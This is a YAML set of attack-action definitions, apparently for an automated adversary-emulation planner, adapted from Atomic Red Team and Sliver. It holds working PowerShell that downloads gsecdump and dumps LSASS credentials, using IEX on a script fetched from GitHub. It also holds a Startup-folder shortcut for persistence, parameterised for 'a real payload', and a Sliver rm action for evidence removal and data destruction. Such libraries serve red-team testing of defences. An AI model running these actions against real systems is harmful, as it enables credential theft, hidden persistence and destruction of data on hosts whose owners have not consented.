  - uuid: art-t1003-gsecdump-lsass
    name: Gsecdump
    id:
      - T1003
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Credential Access
    technique:
      - OS Credential Dumping
    description: |
      Dumps active-session credentials from LSASS via gsecdump-v2b5 (TrueSec
      legacy tool). Uses Method 3 (fold get_prereq_command from ART): the
      action itself stages the binary from web.archive.org with SHA256
      verification if not already present, then runs `gsecdump -a`. Precondition
      is just a powershell session; no marker predicate for the binary. ART
      auto_generated_guid 96345bfc-8ae7-4b6a-80b7-223200f24ef9.
    execution:
      executor: Powershell Executor
      command: |
        if (-not (Test-Path "#{gsecdump_exe}")) {
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          $parentpath = Split-Path "#{gsecdump_exe}"
          $binpath = "$parentpath\gsecdump-v2b5.exe"
          New-Item -ItemType Directory $parentpath -Force | Out-Null
          IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
          if (Invoke-WebRequestVerifyHash "#{gsecdump_url}" "$binpath" "#{gsecdump_bin_hash}") {
            Move-Item $binpath "#{gsecdump_exe}"
          }
        }
        & "#{gsecdump_exe}" -a
    arguments:
      executor:
        description: The Powershell session ID used to invoke the prereq + main command.
        required: true
        pddl_index: executor1_var_in_plan
      gsecdump_exe:
        default: C:\Users\Public\gsecdump.exe
        description: Local path on target where gsecdump binary should be staged and
          run.
        required: true
      gsecdump_url:
        default: 
          https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe
        description: Download URL for the gsecdump-v2b5 binary (web archive).
        required: true
      gsecdump_bin_hash:
        default: 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC
        description: Expected SHA256 of the gsecdump-v2b5.exe binary.
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (credential-data ?d - data ?target - host)
      - (data-stored-c2 ?d - data)
  - uuid: art-t1547_001-startup-folder-lnk
    name: Add Executable Shortcut Link to User Startup Folder
    id:
      - T1547.001
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Persistence
    technique:
      - 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
    description: |
      File-based Startup persistence: creates a `.lnk` shortcut in the
      current user's `Startup` folder pointing at the chosen executable.
      Native Windows shell (WScript.Shell) — no external binary. Original
      ART test hardcodes calc.exe as the target; parameterised here so
      operators can substitute a real payload. ART auto_generated_guid
      24e55612-85f6-4bd6-ae74-a73d02e3441d.
    execution:
      executor: Powershell Executor
      command: |
        $Target = "#{target_path}"
        $ShortcutLocation = "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\#{shortcut_name}"
        $WScriptShell = New-Object -ComObject WScript.Shell
        $Create = $WScriptShell.CreateShortcut($ShortcutLocation)
        $Create.TargetPath = $Target
        $Create.Save()
    arguments:
      executor:
        description: The Powershell session ID used to create the .lnk file.
        required: true
        pddl_index: executor1_var_in_plan
      target_path:
        default: C:\Windows\System32\calc.exe
        description: Full path to the executable the shortcut launches at login.
        required: true
        pddl_index: string4_var_in_plan
      shortcut_name:
        default: ArtPersist.lnk
        description: Filename of the .lnk placed under the Startup folder.
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (command-execution-at-startup ?c - string ?target - host)
  - uuid: sliver-rm
    name: Remove Remote Path
    id:
      - T1070.004
      - T1485
    source: Sliver
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Defense Evasion
      - Impact
    technique:
      - |
        Indicator Removal: File Deletion
      - Data Destruction
    description: The `rm(remote_path, recursive=False, force=False)` command removes
      a directory or file(s) from the remote system. Parameters include remote_path
      (remote path), recursive (recursively remove file(s)), and force (forcefully
      remove the file(s)).
    execution:
      executor: Sliver Executor
      command: |
        rm(session_id=#{executor}, remote_path=#{RemotePath}, recursive=#{Recursive}, force=#{Force})
    arguments:
      executor:
        description: The session ID of the active Sliver connection.
        required: true
        pddl_index: executor0_var_in_plan
      RemotePath:
        description: Remote path
        required: true
        pddl_index: string1_var_in_plan
      Recursive:
        description: Recursively remove file(s)
        required: true
      Force:
        description: Forcefully remove the file(s)
        required: true
    preconditions:
      - operator: or
        operands:
          - (os-windows ?target - host)
          - (os-linux ?target - host)
          - (os-macos ?target - host)
      - (sliver-session ?executorID - executor ?target - host)
      - (file-exists ?path - string ?f - file ?target - host)
    effects:
      - (file-deleted ?f - file ?target - host)
